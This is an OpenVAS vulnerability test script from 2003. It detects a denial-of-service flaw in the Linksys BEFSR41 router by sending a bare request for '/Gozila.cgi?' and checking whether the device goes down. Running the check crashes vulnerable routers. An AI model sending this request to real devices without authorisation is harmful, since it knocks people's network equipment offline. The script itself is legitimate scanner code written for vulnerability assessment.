# OpenVAS Vulnerability Test
# $Id: linksys_gozila_cgi_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Linksys Gozila CGI denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The Linksys BEFSR41 EtherFast Cable/DSL Router crashes
if somebody accesses the Gozila CGI without argument on
the web administration interface.";

tag_solution = "upgrade your router firmware to 1.42.7.";

# References:
#
# From: "David Endler" <dendler@idefense.com>
# To: vulnwatch@vulnwatch.org
# Date: Thu, 31 Oct 2002 21:09:10 -0500
# Subject: iDEFENSE Security Advisory 10.31.02a: Denial of Service Vulnerability in Linksys BEFSR41 EtherFast Cable/DSL Router
# 
# http://www.linksys.com/products/product.asp?prid=20&grid=23

if(description)
{
  script_id(11773);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
 
  name = "Linksys Gozila CGI denial of service";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;


  script_description(desc);    
  summary = "Request for Gozila.cgi? crashes the Linksys router"; 
  script_summary(summary);
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");

  family = "Denial of Service";
  script_family(family);
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);
# Maybe we should look into the misc CGI directories?
r = http_get(port: port, item: "/Gozila.cgi?");
send(socket: soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

alive = end_denial();
if (! alive) security_hole(port);
